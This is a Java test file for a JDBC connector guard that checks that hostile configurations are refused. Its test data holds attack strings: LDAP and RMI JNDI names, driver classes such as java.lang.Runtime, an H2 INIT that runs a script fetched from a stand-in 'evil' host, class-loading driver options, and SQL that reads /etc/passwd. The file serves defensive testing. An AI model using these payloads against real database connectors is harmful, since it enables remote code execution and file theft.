package com.on.ebx.connect.connectors;

import java.sql.Connection;
import java.util.LinkedHashMap;
import java.util.Map;

import com.on.ebx.connect.core.JdbcGuard;
import com.on.ebx.connect.spi.ConnectorConfig;
import com.on.ebx.connect.spi.ConnectorException;

/**
 * Audit C-04: what a connector row may make the server load or run. Every refusal below must name the JVM property
 * that would allow it, every URL the module seeds or the demo uses must still pass, and a real in-memory H2
 * connection through {@code connect()} must still open while a hostile one never reaches DriverManager.
 */
public final class JdbcGuardTest
{
	private JdbcGuardTest() { }

	public static void main(final String[] pArgs) throws Exception
	{
		jndi();
		drivers();
		urls();
		properties();
		statements();
		seeds();
		connect();
		System.out.println("PASS: JDBC connector configuration cannot load classes, run SQL at connection time, or read files");
	}

	private static void jndi() throws Exception
	{
		JdbcGuard.checkJndiName("java:comp/env/jdbc/mdm");
		refused(new Check() { public void run() throws Exception { JdbcGuard.checkJndiName("java:/jdbc/mdm"); } }, JdbcGuard.PROPERTY_JNDI_PREFIXES);
		for (final String name : new String[] { "ldap://evil/a", "rmi://evil/a", "dns://evil/a", "java:comp/env/../x", "java:comp/env\\x", "", null, "jdbc/mdm", "java:comp/env" })
		{
			final String hostile = name;
			refused(new Check() { public void run() throws Exception { JdbcGuard.checkJndiName(hostile); } }, JdbcGuard.PROPERTY_JNDI_PREFIXES);
		}
		System.setProperty(JdbcGuard.PROPERTY_JNDI_PREFIXES, "java:/, java:jboss/");
		try
		{
			JdbcGuard.checkJndiName("java:/jdbc/mdm");
			JdbcGuard.checkJndiName("java:jboss/datasources/x");
			JdbcGuard.checkJndiName("java:comp/env/jdbc/mdm");
			refused(new Check() { public void run() throws Exception { JdbcGuard.checkJndiName("ldap://evil/a"); } }, JdbcGuard.PROPERTY_JNDI_PREFIXES);
		}
		finally { System.clearProperty(JdbcGuard.PROPERTY_JNDI_PREFIXES); }
	}

	private static void drivers() throws Exception
	{
		JdbcGuard.checkDriver("jdbc:h2:mem:t", "org.h2.Driver");
		JdbcGuard.checkDriver("jdbc:h2:mem:t", null);
		JdbcGuard.checkDriver("jdbc:h2:mem:t", "  ");
		JdbcGuard.checkDriver("jdbc:postgresql://h/db", "org.postgresql.Driver");
		JdbcGuard.checkDriver("JDBC:POSTGRESQL://h/db", "org.postgresql.Driver");
		JdbcGuard.checkDriver("jdbc:mysql://h/db", "com.mysql.cj.jdbc.Driver");
		JdbcGuard.checkDriver("jdbc:oracle:thin:@//h:1521/s", "oracle.jdbc.OracleDriver");
		JdbcGuard.checkDriver("jdbc:sybase:Tds:h:5000/d", "com.sybase.jdbc4.jdbc.SybDriver");
		JdbcGuard.checkDriver("jdbc:IRIS://h:1972/USER", "com.intersystems.jdbc.IRISDriver");
		JdbcGuard.checkDriver("jdbc:snowflake://a.snowflakecomputing.com/?db=X", "net.snowflake.client.jdbc.SnowflakeDriver");
		for (final String[] pair : new String[][] { { "jdbc:h2:mem:t", "org.postgresql.Driver" }, { "jdbc:postgresql://h/db", "org.h2.Driver" },
			{ "jdbc:postgresql://h/db", "java.lang.Runtime" }, { "jdbc:postgresql://h/db", "com.evil.Gadget" }, { "jdbc:foo://h/db", "com.evil.Gadget" }, { "jdbc:foo://h/db", "java.lang.Runtime" },
			{ "jdbc:mysql://h/db", "org.postgresql.Driver" } })
		{
			final String[] hostile = pair;
			refused(new Check() { public void run() throws Exception { JdbcGuard.checkDriver(hostile[0], hostile[1]); } }, JdbcGuard.PROPERTY_DRIVERS);
		}
		JdbcGuard.checkDriver("jdbc:ebx-singlestore:test", "com.mysql.cj.jdbc.Driver"); // unknown scheme, known driver: a test double or a rebranded URL
		System.setProperty(JdbcGuard.PROPERTY_DRIVERS, "com.acme.FooDriver");
		try
		{
			JdbcGuard.checkDriver("jdbc:foo://h/db", "com.acme.FooDriver");
			refused(new Check() { public void run() throws Exception { JdbcGuard.checkDriver("jdbc:foo://h/db", "com.evil.Gadget"); } }, JdbcGuard.PROPERTY_DRIVERS);
		}
		finally { System.clearProperty(JdbcGuard.PROPERTY_DRIVERS); }
		check("postgresql".equals(JdbcGuard.subProtocol("jdbc:postgresql://h/db")) && "oracle".equals(JdbcGuard.subProtocol("jdbc:oracle:thin:@x"))
			&& "h2".equals(JdbcGuard.subProtocol("jdbc:h2:tcp://x/y")) && JdbcGuard.subProtocol("java:comp/env/x") == null && JdbcGuard.subProtocol("jdbc:") == null,
			"sub-protocol read");
	}

	private static void urls() throws Exception
	{
		// what runs today
		for (final String url : new String[] { "jdbc:h2:tcp://localhost:9095/mdm", "jdbc:h2:tcp://localhost:9092/repository", "jdbc:h2:mem:test", "jdbc:h2:mem:",
			"jdbc:h2:mem:wmtest;DB_CLOSE_DELAY=-1", "jdbc:h2:ssl://h:9093/x", "jdbc:postgresql://localhost:5432/mdm", "jdbc:postgresql://db.corp:5432/mdm?ssl=true&sslmode=require",
			"jdbc:mysql://db.example:3306/mdm?useSSL=true", "jdbc:sqlserver://sql.corp:1433;databaseName=MDM;encrypt=true", "jdbc:oracle:thin:@//ora.corp:1521/ORCL",
			"jdbc:hive2://spark.example:10001/default;transportMode=http;httpPath=cliservice;ssl=true", "jdbc:teradata://vantage.example/DATABASE=GOVERNED,TMODE=ANSI",
			"jdbc:ingres://vector.example:VW7/governed;encryption=on", "jdbc:snowflake://acme.snowflakecomputing.com/?db=ANALYTICS" })
		{
			JdbcGuard.checkUrl(url);
		}
		final String[] hostile = { "jdbc:h2:file:/tmp/x", "jdbc:h2:~/test", "jdbc:h2:./x", "jdbc:h2:/abs/x", "jdbc:h2:test", "jdbc:h2:zip:/x.zip!/db", "jdbc:h2:nioMapped:/x",
			"jdbc:h2:mem", "JDBC:H2:FILE:/x" };
		for (final String url : hostile)
		{
			final String u = url;
			refused(new Check() { public void run() throws Exception { JdbcGuard.checkUrl(u); } }, JdbcGuard.PROPERTY_H2_FILE);
		}
		final String[] options = { "jdbc:h2:mem:t;INIT=RUNSCRIPT FROM 'http://evil/x.sql'", "jdbc:h2:mem:t;init=select 1", "jdbc:h2:tcp://h/db;INIT=CREATE ALIAS X AS 'void x(){}'",
			"jdbc:h2:mem:t;I%4eIT=select 1", "jdbc:h2:mem:t;DATABASE_EVENT_LISTENER='com.x.L'", "jdbc:h2:mem:t;JAVA_OBJECT_SERIALIZER=com.x.S",
			"jdbc:postgresql://h/db?socketFactory=com.x.F&socketFactoryArg=a", "jdbc:postgresql://h/db?sslfactory=com.x.F", "jdbc:postgresql://h/db?sslfactoryarg=a",
			"jdbc:postgresql://h/db?SSLHostnameVerifier=com.x.V", "jdbc:postgresql://h/db?sslpasswordcallback=com.x.C", "jdbc:postgresql://h/db?authenticationPluginClassName=com.x.P",
			"jdbc:postgresql://h/db?loggerFile=/tmp/x", "jdbc:postgresql://h/db?ssl=true&socket_factory=com.x.F", "jdbc:postgresql://h/db?socket%46actory=com.x.F",
			"jdbc:postgresql://h/db?socket%2546actory=com.x.F", "jdbc:mysql://h/db?allowLoadLocalInfile=true", "jdbc:mysql://h/db?autoDeserialize=true",
			"jdbc:mysql://h/db?queryInterceptors=com.x.I", "jdbc:mysql://h/db?allowUrlInLocalInfile=true", "jdbc:sqlserver://h;databaseName=x;socketFactoryClass=com.x.F",
			"jdbc:sqlserver://h;accessTokenCallbackClass=com.x.T", "jdbc:db2://h:50000/d:traceFile=/tmp/x;" };
		for (final String url : options)
		{
			final String u = url;
			refused(new Check() { public void run() throws Exception { JdbcGuard.checkUrl(u); } }, JdbcGuard.PROPERTY_OPTIONS);
		}
		// the H2 file door opens, the options stay shut
		System.setProperty(JdbcGuard.PROPERTY_H2_FILE, "true");
		try
		{
			JdbcGuard.checkUrl("jdbc:h2:file:/tmp/x");
			JdbcGuard.checkUrl("jdbc:h2:~/test");
			refused(new Check() { public void run() throws Exception { JdbcGuard.checkUrl("jdbc:h2:file:/tmp/x;INIT=select 1"); } }, JdbcGuard.PROPERTY_OPTIONS);
		}
		finally { System.clearProperty(JdbcGuard.PROPERTY_H2_FILE); }
		System.setProperty(JdbcGuard.PROPERTY_OPTIONS, "loggerFile, queryInterceptors");
		try
		{
			JdbcGuard.checkUrl("jdbc:postgresql://h/db?loggerFile=/tmp/x");
			JdbcGuard.checkUrl("jdbc:mysql://h/db?queryInterceptors=com.x.I");
			refused(new Check() { public void run() throws Exception { JdbcGuard.checkUrl("jdbc:postgresql://h/db?socketFactory=com.x.F"); } }, JdbcGuard.PROPERTY_OPTIONS);
		}
		finally { System.clearProperty(JdbcGuard.PROPERTY_OPTIONS); }
	}

	private static void properties() throws Exception
	{
		final Map<String, String> fine = new LinkedHashMap<String, String>();
		fine.put("sslMode", "VERIFY_IDENTITY"); fine.put("allowPublicKeyRetrieval", "false"); fine.put("useServerPrepStmts", "true");
		fine.put("serverTimezone", "UTC"); fine.put("encrypt", "true"); fine.put("trustServerCertificate", "false"); fine.put("hostNameInCertificate", "x");
		fine.put("loggerLevel", "OFF"); fine.put("ApplicationName", "ebx");
		JdbcGuard.checkProperties(fine);
		JdbcGuard.checkProperties(null);
		// audit C2-20: one file-reading option per driver family, in the properties and, for URL-style drivers, in the URL
		final Map<String, String> ordinary = new LinkedHashMap<String, String>();
		ordinary.put("sslmode", "verify-full"); ordinary.put("currentSchema", "mdm"); ordinary.put("connectionProfile", "x"); ordinary.put("warehouse", "W");
		JdbcGuard.checkProperties(ordinary);
		for (final String name : new String[] { "sslrootcert", "sslcert", "sslkey", "loggerFile", "trustCertificateKeyStoreUrl",
			"clientCertificateKeyStoreUrl", "serverRSAPublicKeyFile", "localSocket", "trustStore", "serverCertificate", "private_key_file",
			"oracle.net.wallet_location", "oracle.net.tns_admin", "TRACE_LEVEL_FILE", "javax.net.ssl.trustStore" })
		{
			final Map<String, String> hostile = new LinkedHashMap<String, String>();
			hostile.put(name, "/etc/x");
			refused(new Check() { public void run() throws Exception { JdbcGuard.checkProperties(hostile); } }, JdbcGuard.PROPERTY_OPTIONS);
		}
		JdbcGuard.checkUrl("jdbc:postgresql://h/db?sslmode=verify-full&currentSchema=x&serverTimezone=UTC");
		for (final String url : new String[] { "jdbc:postgresql://h/db?sslrootcert=/etc/ssl/x.pem", "jdbc:postgresql://h/db?sslkey=/k&sslcert=/c",
			"jdbc:mysql://h/db?allowLoadLocalInfile=true", "jdbc:mysql://h/db?trustCertificateKeyStoreUrl=file:/x",
			"jdbc:mariadb://h/db?localSocket=/tmp/s", "jdbc:sqlserver://h;databaseName=x;trustStore=/x", "jdbc:h2:tcp://h/x;TRACE_LEVEL_FILE=3",
			"jdbc:h2:tcp://h/x;INIT=RUNSCRIPT FROM '/x'", "jdbc:snowflake://a.snowflakecomputing.com/?private_key_file=/k.p8" })
		{
			refused(new Check() { public void run() throws Exception { JdbcGuard.checkUrl(url); } }, JdbcGuard.PROPERTY_OPTIONS);
		}
		System.setProperty(JdbcGuard.PROPERTY_OPTIONS, "sslrootcert");
		try { JdbcGuard.checkUrl("jdbc:postgresql://h/db?sslrootcert=/etc/ssl/x.pem"); }
		finally { System.clearProperty(JdbcGuard.PROPERTY_OPTIONS); }
		for (final String name : new String[] { "INIT", "init", "socketFactory", "socket_factory", "SocketFactoryArg", "sslfactory", "sslfactoryarg", "sslhostnameverifier",
			"sslpasswordcallback", "authenticationPluginClassName", "loggerFile", "allowLoadLocalInfile", "autoDeserialize", "queryInterceptors", "trust-manager-class",
			"DATABASE_EVENT_LISTENER" })
		{
			final Map<String, String> hostile = new LinkedHashMap<String, String>();
			hostile.put("sslMode", "REQUIRED");
			hostile.put(name, "x");
			refused(new Check() { public void run() throws Exception { JdbcGuard.checkProperties(hostile); } }, JdbcGuard.PROPERTY_OPTIONS);
		}
	}

	private static void statements() throws Exception
	{
		final String mem = "jdbc:h2:mem:t";
		for (final String sql : new String[] { "select 1", "SELECT * FROM CONTACT WHERE ID = ?", "create table alias_log (id int, alias varchar(10))", "create table trigger_log (id int)",
			"insert into t values ('csvread')", "-- create alias\nselect 1" })
		{
			JdbcGuard.checkStatement(mem, sql);
		}
		for (final String sql : new String[] { "CREATE ALIAS EXEC AS 'void x(){}'", "create   or replace alias x as $$ void x(){} $$", "CREATE/**/ALIAS x AS 'void x(){}'",
			"create trigger t before insert on x call 'com.x.T'", "CREATE AGGREGATE a FOR 'com.x.A'", "select * from csvread('/etc/passwd')", "select FILE_READ('/etc/passwd')",
			"CALL FILE_WRITE('a', '/tmp/x')", "  script to '/tmp/x'", "RUNSCRIPT FROM '/tmp/x'", "select * from LINK_SCHEMA('A','','jdbc:x','u','p','PUBLIC')" })
		{
			final String hostile = sql;
			refused(new Check() { public void run() throws Exception { JdbcGuard.checkStatement(mem, hostile); } }, JdbcGuard.PROPERTY_H2_CODE);
		}
		// not an in-JVM database: the statement runs elsewhere
		JdbcGuard.checkStatement("jdbc:h2:tcp://localhost:9095/x", "CREATE ALIAS X AS 'void x(){}'");
		JdbcGuard.checkStatement("jdbc:postgresql://h/db", "create trigger t before insert on x execute function f()");
		System.setProperty(JdbcGuard.PROPERTY_H2_CODE, "true");
		try { JdbcGuard.checkStatement(mem, "CREATE ALIAS EXEC AS 'void x(){}'"); }
		finally { System.clearProperty(JdbcGuard.PROPERTY_H2_CODE); }
	}

	/** Every connection the installer seeds, with the driver its connector defaults, passes. */
	private static void seeds() throws Exception
	{
		final Object[][] seeds = { { new PostgreSqlConnector(), "jdbc:postgresql://localhost:5432/mdm" }, { new H2Connector(), "jdbc:h2:tcp://localhost:9092/mdm" },
			{ new MySqlConnector(), "jdbc:mysql://HOST:3306/MDM" }, { new SqlServerConnector(), "jdbc:sqlserver://HOST:1433;databaseName=MDM" },
			{ new AzureSqlDatabaseConnector(), "jdbc:sqlserver://SERVER.database.windows.net:1433;databaseName=MDM" },
			{ new OracleDatabaseConnector(), "jdbc:oracle:thin:@//localhost:1521/FREEPDB1" }, { new Db2LuwConnector(), "jdbc:db2://HOST:50000/DATABASE" },
			{ new IrisConnector(), "jdbc:IRIS://HOST:1972/NAMESPACE" }, { new SapAseConnector(), "jdbc:sybase:Tds:HOST:5000/DATABASE" },
			{ new SapHanaConnector(), "jdbc:sap://HOST:30015" }, { new TeradataConnector(), "jdbc:teradata://HOST/DATABASE=DATABASE" },
			{ new VerticaConnector(), "jdbc:vertica://HOST:5433/DATABASE" }, { new ActianVectorConnector(), "jdbc:ingres://HOST:II7/DATABASE" },
			{ new ActianIngresConnector(), "jdbc:ingres://HOST:II7/DATABASE" }, { new MonetDbConnector(), "jdbc:monetdb://HOST:50000/DATABASE" },
			{ new SparkSqlConnector(), "jdbc:hive2://HOST:10000/default;ssl=true" },
			{ new ClouderaHiveConnector(), "jdbc:hive2://HOST/default;transportMode=http;httpPath=cliservice;ssl=true" },
			{ new ClouderaImpalaConnector(), "jdbc:impala://HOST:443/default;AuthMech=3;transportMode=http;httpPath=cliservice;SSL=1" }, { new FirebirdConnector(), "jdbc:firebirdsql://HOST:3050/DATABASE" },
			{ new GreenplumConnector(), "jdbc:postgresql://HOST:5432/DATABASE" }, { new SingleStoreConnector(), "jdbc:singlestore://HOST:3306/DATABASE" },
			{ new SingleStoreConnector(), "jdbc:mysql://HOST:3306/DATABASE" } };
		for (final Object[] seed : seeds)
		{
			final JdbcConnector connector = (JdbcConnector) seed[0];
			final ConnectorConfig config = new ConnectorConfig();
			config.setBaseUrl((String) seed[1]);
			connector.configure(config);
			final String driver = config.getProperty("driver", null);
			check(driver != null, connector.getType() + " defaults a driver");
			JdbcGuard.checkUrl(config.getBaseUrl());
			JdbcGuard.checkDriver(config.getBaseUrl(), driver);
			final Map<String, String> driverProperties = new LinkedHashMap<String, String>();
			for (final Map.Entry<String, String> property : config.getProperties().entrySet())
				if (property.getKey().startsWith("jdbc.")) driverProperties.put(property.getKey().substring(5), property.getValue());
			JdbcGuard.checkProperties(driverProperties);
		}
	}

	/** connect() opens a real in-memory H2 and never reaches the driver with a hostile configuration. */
	private static void connect() throws Exception
	{
		final Connection ok = connector("jdbc:h2:mem:guardtest;DB_CLOSE_DELAY=-1", null, null).connect();
		check(!ok.isClosed(), "an allowed in-memory H2 URL connects");
		ok.close();
		final Object[][] hostile = { { "jdbc:h2:file:/private/tmp/ebx-guard-never", null, null }, { "jdbc:h2:mem:g2;INIT=select 1", null, null },
			{ "jdbc:h2:mem:g3", "org.postgresql.Driver", null }, { "jdbc:h2:mem:g4", null, "init" }, { "jdbc:h2:mem:g5", null, "socket_factory" } };
		for (final Object[] one : hostile)
		{
			final JdbcConnector connector = connector((String) one[0], (String) one[1], (String) one[2]);
			try { connector.connect(); check(false, "refused: " + one[0]); }
			catch (final ConnectorException expected) { check(expected.getMessage().startsWith("JDBC: "), "refusal says so: " + expected.getMessage()); }
		}
		final ConnectorConfig jndi = new ConnectorConfig();
		jndi.setBaseUrl("jdbc:h2:mem:x"); jndi.setProperty("jndi", "ldap://127.0.0.1:1/a");
		final H2Connector byJndi = new H2Connector();
		byJndi.configure(jndi);
		try { byJndi.connect(); check(false, "refused: ldap JNDI name"); }
		catch (final ConnectorException expected) { check(expected.getMessage().contains(JdbcGuard.PROPERTY_JNDI_PREFIXES), "JNDI refusal names its property"); }
	}

	private static JdbcConnector connector(final String pUrl, final String pDriver, final String pJdbcOption)
	{
		final ConnectorConfig config = new ConnectorConfig();
		config.setId("guard"); config.setType("h2"); config.setBaseUrl(pUrl);
		config.setAuthType(ConnectorConfig.AuthType.BASIC); config.setUsername("sa"); config.setPassword("");
		if (pDriver != null) config.setProperty("driver", pDriver);
		if (pJdbcOption != null) config.setProperty("jdbc." + pJdbcOption, "x");
		final H2Connector connector = new H2Connector();
		connector.configure(config);
		return connector;
	}

	private interface Check { void run() throws Exception; }

	/** The check must refuse with a JDBC refusal that names the property which would allow the value. */
	private static void refused(final Check pCheck, final String pProperty) throws Exception
	{
		try
		{
			pCheck.run();
		}
		catch (final ConnectorException expected)
		{
			check(expected.getMessage().startsWith("JDBC: ") && expected.getMessage().contains(pProperty), "message names " + pProperty + ": " + expected.getMessage());
			return;
		}
		throw new AssertionError("expected a refusal naming " + pProperty);
	}

	private static void check(final boolean pPass, final String pMessage)
	{
		if (!pPass) throw new AssertionError(pMessage);
	}
}
